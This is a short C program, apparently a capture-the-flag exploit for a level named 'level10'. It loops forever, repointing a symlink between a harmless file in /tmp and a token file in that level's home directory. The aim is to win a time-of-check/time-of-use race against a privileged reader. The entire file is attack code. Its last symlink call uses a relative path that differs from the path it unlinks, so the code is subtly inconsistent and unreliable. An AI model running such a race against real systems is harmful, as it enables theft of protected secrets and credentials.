#include <unistd.h>
#include <stdio.h>

int main() {
    while (1) {
        unlink("/tmp/symlink");                      // Remove the symlink
        symlink("/tmp/file", "/tmp/symlink");    // Point to harmless file
        unlink("/tmp/symlink");
        symlink("/home/user/level10/token", "symlink");   // Point to token file
    }
    return 0;
}

